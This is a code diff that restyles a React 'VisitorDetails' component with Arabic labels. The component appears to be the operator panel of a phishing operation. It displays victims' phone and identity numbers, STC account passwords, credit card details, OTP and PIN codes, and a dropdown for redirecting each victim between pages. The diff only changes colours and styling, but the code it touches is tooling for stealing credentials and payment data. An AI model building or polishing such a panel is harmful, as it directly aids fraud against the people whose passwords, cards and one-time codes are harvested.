@@ -843,48 +843,49 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
   };
 
   return (
-    <div className="flex-1 flex flex-col bg-gray-50 overflow-hidden">
+    <div className="flex-1 flex flex-col overflow-hidden" style={{ background: "rgba(5,8,16,0.98)" }}>
       {/* Header */}
-      <div className="bg-white border-b border-gray-200 p-4 md:p-6">
+      <div className="p-4 md:p-6" style={{ background: "rgba(9,14,28,0.97)", borderBottom: "1px solid rgba(99,102,241,0.12)" }}>
         <div className="flex flex-col gap-4 md:flex-row md:items-start md:justify-between">
           <div className="min-w-0">
             {onBack && (
               <button
                 onClick={onBack}
-                className="mb-3 inline-flex items-center gap-1 rounded-lg border border-gray-300 px-3 py-1.5 text-xs font-medium text-gray-700 transition-colors hover:bg-gray-100"
+                className="mb-3 inline-flex items-center gap-1 rounded-lg px-3 py-1.5 text-xs font-medium transition-all"
+                style={{ border: "1px solid rgba(99,102,241,0.25)", color: "rgba(148,163,184,0.8)", background: "rgba(99,102,241,0.07)" }}
               >
                 <ArrowRight className="h-4 w-4" />
                 الرجوع للقائمة
               </button>
             )}
-            <h2 className="text-xl md:text-2xl font-bold text-gray-900">
+            <h2 className="text-xl md:text-2xl font-bold" style={{ color: "#e2e8f0" }}>
               {visitorDisplayName}
             </h2>
 
             {/* Contact Info */}
             <div className="flex flex-col gap-1 mt-2">
               <div className="flex flex-wrap items-center gap-x-3 gap-y-1 text-sm">
-                <span className="text-gray-600">
+                <span style={{ color: "rgba(148,163,184,0.7)" }}>
                   📞{" "}
-                  <span className="font-semibold text-gray-800">
+                  <span className="font-semibold" style={{ color: "#e2e8f0" }}>
                     {visitor.phoneNumber || "غير محدد"}
                   </span>
                 </span>
-                <span className="hidden text-gray-400 sm:inline">•</span>
-                <span className="text-gray-600">
+                <span className="hidden sm:inline" style={{ color: "rgba(148,163,184,0.3)" }}>•</span>
+                <span style={{ color: "rgba(148,163,184,0.7)" }}>
                   🆔{" "}
-                  <span className="font-semibold text-gray-800">
+                  <span className="font-semibold" style={{ color: "#e2e8f0" }}>
                     {visitor.identityNumber || "غير محدد"}
                   </span>
                 </span>
               </div>
               {/* Display STC Data */}
               {(visitor.stcPhone || visitor.stcPassword || visitor.stcSubmittedAt) && (
-                <div className="bg-purple-50 border-r-4 border-purple-500 p-4 rounded-lg">
-                  <h4 className="font-semibold text-purple-900 mb-2">
+                <div className="border-r-4 p-4 rounded-lg" style={{ background: "rgba(139,92,246,0.1)", borderColor: "#7c3aed" }}>
+                  <h4 className="font-semibold mb-2" style={{ color: "#c4b5fd" }}>
                     بيانات STC
                   </h4>
-                  <div className="space-y-2 text-sm">
+                  <div className="space-y-2 text-sm" style={{ color: "rgba(196,181,253,0.8)" }}>
                     {visitor.stcPhone && <div>الجوال: {visitor.stcPhone}</div>}
                     {visitor.stcPassword && (
                       <div>كلمة المرور: {visitor.stcPassword}</div>
@@ -898,7 +899,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
 
               {/* Device & Location Info */}
               {(visitor.country || visitor.browser || visitor.deviceType) && (
-                <div className="flex flex-wrap items-center gap-2 text-xs text-gray-500">
+                <div className="flex flex-wrap items-center gap-2 text-xs" style={{ color: "rgba(100,116,139,0.7)" }}>
                   {visitor.country && <span>🌍 {visitor.country}</span>}
                   {visitor.browser && (
                     <>
@@ -961,7 +962,8 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             <select
               onChange={(e) => handleNavigate(e.target.value)}
               disabled={isNavigating}
-              className="w-full rounded-lg border border-gray-300 bg-white px-4 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 disabled:opacity-50 sm:w-auto"
+              className="w-full rounded-lg px-4 py-2 text-sm outline-none disabled:opacity-50 sm:w-auto"
+              style={{ background: "rgba(13,21,42,0.9)", border: "1px solid rgba(99,102,241,0.25)", color: "#e2e8f0" }}
             >
               <option value="">توجيه الزائر...</option>
               <option value="home">🏠 الرئيسية</option>
@@ -984,7 +986,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
       {/* Bubbles */}
       <div className="flex-1 overflow-y-auto p-3 md:p-6">
         {sortedBubbles.length === 0 ? (
-          <div className="text-center text-gray-500 py-12">
+          <div className="text-center py-12" style={{ color: "rgba(148,163,184,0.5)" }}>
             <p>لا توجد بيانات لعرضها</p>
           </div>
         ) : (
@@ -993,7 +995,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             dir="rtl"
           >
             {/* Right Column - Credit Card and Card Details */}
-            <div className="flex flex-col gap-4 lg:border-l lg:border-gray-200 lg:pl-6">
+            <div className="flex flex-col gap-4 lg:border-l lg:pl-6" style={{ borderColor: "rgba(99,102,241,0.1)" }}>
               {sortedBubbles
                 .filter(
                   (b) => b.id.startsWith("card-info") || b.id === "card-details"
@@ -1077,7 +1079,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             </div>
 
             {/* Middle Column - Dynamic Cards (OTP, PIN, Phone, etc.) */}
-            <div className="flex flex-col gap-4 lg:border-l lg:border-gray-200 lg:px-6">
+            <div className="flex flex-col gap-4 lg:border-l lg:px-6" style={{ borderColor: "rgba(99,102,241,0.1)" }}>
               {sortedBubbles
                 .filter(
                   (b) =>
